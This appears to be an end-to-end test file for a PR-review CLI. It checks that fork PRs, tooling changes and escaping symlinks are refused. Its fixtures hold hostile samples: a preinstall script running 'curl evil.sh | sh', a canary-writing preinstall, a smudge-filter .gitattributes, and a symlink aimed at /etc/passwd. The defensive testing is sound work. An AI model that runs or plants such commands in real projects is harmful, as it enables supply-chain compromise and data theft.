// End-to-end tests for the `revkit review <pr>` command's refusal
// paths. Each test uses a real git fixture (through
// helpers/git-fixture) and the fake fetch (through helpers/fake-github)
// so nothing hits the network and every git operation runs on real
// blobs. `--no-serve` is passed everywhere so no daemon starts.
//
// **The safety story runs live here**: the fork refusal, the
// tooling-diff refusal, the correct `--trust` acceptance, the wrong
// `--trust` refusal — every path is exercised end-to-end. Every one
// of those cases is proved RED against a weakened implementation in
// `cli-refusals-weakened.test.ts`.

import { afterAll, describe, expect, test } from "bun:test";
import { rmSync } from "node:fs";
import { GitHubAdapter } from "@revkit/review-core";
import { runReviewCommand } from "../../src/review/cli.ts";
import { spawnGit } from "../../src/git-runner.ts";
import type { GhRunner } from "../../src/gh-runner.ts";
import { makeFakeGithubFetch, type FakePr } from "./helpers/fake-github.ts";
import { makeFixtureRepo, makeInterceptingGitRunner, MIN_VOCAB_YAML } from "./helpers/git-fixture.ts";

const tempDirsToClean: string[] = [];
afterAll(() => {
  for (const dir of tempDirsToClean) {
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* fine */
    }
  }
});

/** A `gh` runner that returns a plausible token for `gh auth token`.
 * Never spawned in these tests because we inject a `makeAdapter` that
 * uses a static token; kept here for completeness. */
const fakeGh: GhRunner = async () => ({
  stdout: "ghp_" + "a".repeat(40) + "\n",
  stderr: "",
  exitCode: 0,
});

/** Wrapper around `runReviewCommand` — the fixture's origin is not
 * a real GitHub, so we use an intercepting `GitRunner` that
 * rewrites the fetch into a local `update-ref`. This is the
 * SHIPPING fetch path (always fetch, no early-return), just with
 * the network hop stubbed. */
async function runReview(
  fixtureRepo: string,
  args: readonly string[],
  env: Parameters<typeof runReviewCommand>[1],
  prs: readonly FakePr[],
): Promise<ReturnType<typeof runReviewCommand>> {
  const pulls = new Map<number, string>();
  for (const pr of prs) pulls.set(pr.pullNumber, pr.headSha);
  const gitInterceptor = makeInterceptingGitRunner({ repoDir: fixtureRepo, pulls });
  return runReviewCommand(args, { ...env, git: gitInterceptor });
}

/** Build a review env pointed at a fixture repo, an adapter that
 * uses the fake fetch, and no build hook / no serve. */
function makeEnv(fixtureCwd: string, prs: readonly FakePr[]): Parameters<typeof runReviewCommand>[1] {
  const staticToken = {
    async getToken() {
      return "ghp_" + "a".repeat(40);
    },
  };
  const fetch = makeFakeGithubFetch(prs);
  const makeAdapter = () => new GitHubAdapter({ token: staticToken, fetch });
  return {
    cwd: fixtureCwd,
    version: "0.0.0",
    gh: fakeGh,
    git: spawnGit,
    repoSlug: "vig-os/revkit",
    makeAdapter,
    localUserId: "review-cli-test",
    // Skip check-dist in the refusal tests — those exercise the
    // safety gates before the built dist is inspected. The
    // integration test covers check-dist end-to-end.
    _skipCheckDist: true,
    // Stub the safe build so tests do not spawn astro.
    build: async ({ distOutDir }: { distOutDir: string }) => {
      const { mkdirSync, writeFileSync } = await import("node:fs");
      mkdirSync(distOutDir, { recursive: true, mode: 0o700 });
      writeFileSync(`${distOutDir}/index.html`, "<!doctype html><title>x</title>");
    },
    // No serve — 2a's cli scope doesn't require the daemon here.
  };
}

/** Add a `"name": "revkit"` package.json to the fixture so
 * `findRepoRootByPackageJson` accepts it. */
const BASE_PKG_JSON = JSON.stringify({ name: "revkit", private: true }, null, 2);

describe("revkit review — fork refusal", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: BASE_PKG_JSON },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        MIN_VOCAB_YAML,
      ],
    },
    head: {
      message: "PR from a fork",
      files: [{ kind: "file", path: "docs/index.md", content: "# pr\n" }],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  const pr: FakePr = {
    owner: "vig-os",
    repo: "revkit",
    pullNumber: 100,
    nodeId: "PR_1",
    title: "fork PR",
    state: "open",
    headSha: fixture.headSha,
    headRef: "pr",
    baseSha: fixture.baseSha,
    baseRef: "main",
    // The distinguishing bit: head repo differs from base repo →
    // fork.
    headRepoFullName: "someone-else/revkit",
    baseRepoFullName: "vig-os/revkit",
    url: "https://github.com/vig-os/revkit/pull/100",
  };

  test("refused without --trust with a diagnostic that names the fork", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["100", "--no-serve"], env, [pr]);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("fork");
    expect(result.stderr).toContain("someone-else/revkit");
    expect(result.stderr).toContain("--trust");
  });

  test("accepted with --trust that matches the head SHA", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["100", "--trust", pr.headSha, "--no-serve"], env, [pr]);
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("Materialized");
  });

  test("refused with a wrong --trust sha", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    // Different plausible sha.
    const wrong = "b".repeat(40);
    const result = await runReview(fixture.repoDir, ["100", "--trust", wrong, "--no-serve"], env, [pr]);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("--trust");
    expect(result.stderr).toContain("does not match");
  });
});

describe("revkit review — tooling diff refusal (same-repo PR)", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: BASE_PKG_JSON },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        MIN_VOCAB_YAML,
      ],
    },
    head: {
      message: "PR changes package.json (tooling)",
      files: [
        {
          kind: "file",
          path: "package.json",
          content: JSON.stringify(
            { name: "revkit", private: true, scripts: { preinstall: "curl evil.sh | sh" } },
            null,
            2,
          ),
        },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  const pr: FakePr = {
    owner: "vig-os",
    repo: "revkit",
    pullNumber: 200,
    nodeId: "PR_2",
    title: "postinstall canary",
    state: "open",
    headSha: fixture.headSha,
    headRef: "pr",
    baseSha: fixture.baseSha,
    baseRef: "main",
    headRepoFullName: "vig-os/revkit",
    baseRepoFullName: "vig-os/revkit",
    url: "https://github.com/vig-os/revkit/pull/200",
  };

  test("refused without --trust and prints the tooling diff", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["200", "--no-serve"], env, [pr]);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("package.json");
    expect(result.stderr).toContain("Tooling files that differ from merge-base");
    expect(result.stderr).toContain(`--trust ${pr.headSha}`);
  });

  test("--trust with the current head SHA materializes with the BASE package.json", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["200", "--trust", pr.headSha, "--no-serve"], env, [pr]);
    expect(result.exitCode).toBe(0);
    // The stdout advertises that tooling came from base.
    expect(result.stdout).toContain("Tooling files taken from BASE");
    expect(result.stdout).toContain("package.json");
  });
});

describe("revkit review — package.json postinstall canary never runs", async () => {
  // A stronger phrasing of the above: the PR-controlled package.json
  // ships a `preinstall` that would drop a file if `bun install`
  // was ever run against it. We verify the canary was NEVER created
  // — because the review pipeline never runs a package script and
  // never checks out a `.gitattributes` filter.
  const CANARY_MARKER = "canary-touched";
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: BASE_PKG_JSON },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        MIN_VOCAB_YAML,
      ],
    },
    head: {
      message: "PR with hostile preinstall",
      files: [
        {
          kind: "file",
          path: "package.json",
          content: JSON.stringify(
            {
              name: "revkit",
              private: true,
              scripts: {
                preinstall: `node -e "require('fs').writeFileSync(process.env.HOME+'/${CANARY_MARKER}','pwned')"`,
              },
            },
            null,
            2,
          ),
        },
        {
          kind: "file",
          // A .gitattributes with a smudge filter that would run a
          // command if git checkout ever ran on the PR content.
          path: ".gitattributes",
          content: "docs/index.md filter=canary\n",
        },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  const pr: FakePr = {
    owner: "vig-os",
    repo: "revkit",
    pullNumber: 300,
    nodeId: "PR_3",
    title: "hostile PR",
    state: "open",
    headSha: fixture.headSha,
    headRef: "pr",
    baseSha: fixture.baseSha,
    baseRef: "main",
    headRepoFullName: "vig-os/revkit",
    baseRepoFullName: "vig-os/revkit",
    url: "https://github.com/vig-os/revkit/pull/300",
  };

  test("run with --trust: no canary was ever created and .gitattributes was NOT taken from PR", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["300", "--trust", pr.headSha, "--no-serve"], env, [pr]);
    expect(result.exitCode).toBe(0);
    // The canary would appear in the user's home. Assert it did
    // not. (We chose HOME so the assertion doesn't depend on a
    // temp dir the test cleans.)
    const homeCanary = process.env.HOME + "/" + CANARY_MARKER;
    // `existsSync` is loaded lazily to keep the import list tidy.
    const { existsSync, readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    expect(existsSync(homeCanary)).toBe(false);

    // The materialized worktree's package.json must equal the BASE
    // package.json (no preinstall), and the .gitattributes must not
    // have been taken from the PR — the PR added it, so it should
    // not appear at all in the materialized tree.
    const materializedRoot = fixture.repoDir + "/.revkit/review/vig-os-revkit-300/head-" + pr.headSha.slice(0, 12);
    const pkg = readFileSync(join(materializedRoot, "package.json"), "utf8");
    expect(pkg).toBe(BASE_PKG_JSON);
    expect(existsSync(join(materializedRoot, ".gitattributes"))).toBe(false);
  });
});

describe("revkit review — content-only PR is accepted without --trust", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: BASE_PKG_JSON },
        { kind: "file", path: "docs/index.md", content: "# base\n" },
        MIN_VOCAB_YAML,
      ],
    },
    head: {
      message: "PR: tweak a doc",
      files: [{ kind: "file", path: "docs/index.md", content: "# PR edit\n" }],
    },
  });
  tempDirsToClean.push(fixture.repoDir);

  const pr: FakePr = {
    owner: "vig-os",
    repo: "revkit",
    pullNumber: 400,
    nodeId: "PR_4",
    title: "content only",
    state: "open",
    headSha: fixture.headSha,
    headRef: "pr",
    baseSha: fixture.baseSha,
    baseRef: "main",
    headRepoFullName: "vig-os/revkit",
    baseRepoFullName: "vig-os/revkit",
    url: "https://github.com/vig-os/revkit/pull/400",
  };

  test("accepted, materialized, check passes, import runs (empty threads)", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["400", "--no-serve"], env, [pr]);
    if (result.exitCode !== 0) {
      // Surface the diagnostics so the assertion prints useful info.
      throw new Error(`unexpected non-zero: stderr=${result.stderr} stdout=${result.stdout}`);
    }
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toContain("Materialized");
    expect(result.stdout).toContain("revkit check: PR content passed");
    expect(result.stdout).toContain("import: 0 new PR thread events");
    // The stdout must NOT contain the phrase "Tooling files that
    // differ" (no refusal fired).
    expect(result.stdout).not.toContain("Tooling files that differ");
  });
});

describe("revkit review — symlink escape in PR content is refused", async () => {
  const fixture = await makeFixtureRepo({
    base: {
      message: "base",
      files: [
        { kind: "file", path: "package.json", content: BASE_PKG_JSON },
        MIN_VOCAB_YAML,
      ],
    },
    head: {
      message: "PR: escaping symlink",
      files: [
        { kind: "file", path: "docs/index.md", content: "# ok\n" },
        { kind: "symlink", path: "docs/leak.md", target: "../../../../../etc/passwd" },
      ],
    },
  });
  tempDirsToClean.push(fixture.repoDir);
  const pr: FakePr = {
    owner: "vig-os",
    repo: "revkit",
    pullNumber: 500,
    nodeId: "PR_5",
    title: "sneaky link",
    state: "open",
    headSha: fixture.headSha,
    headRef: "pr",
    baseSha: fixture.baseSha,
    baseRef: "main",
    headRepoFullName: "vig-os/revkit",
    baseRepoFullName: "vig-os/revkit",
    url: "https://github.com/vig-os/revkit/pull/500",
  };
  test("refused with a symlink-escape diagnostic naming the target", async () => {
    const env = makeEnv(fixture.repoDir, [pr]);
    const result = await runReview(fixture.repoDir, ["500", "--no-serve"], env, [pr]);
    expect(result.exitCode).not.toBe(0);
    expect(result.stderr).toContain("symlink");
    expect(result.stderr).toContain("docs/leak.md");
    expect(result.stderr).toContain("escapes the content root");
  });
});
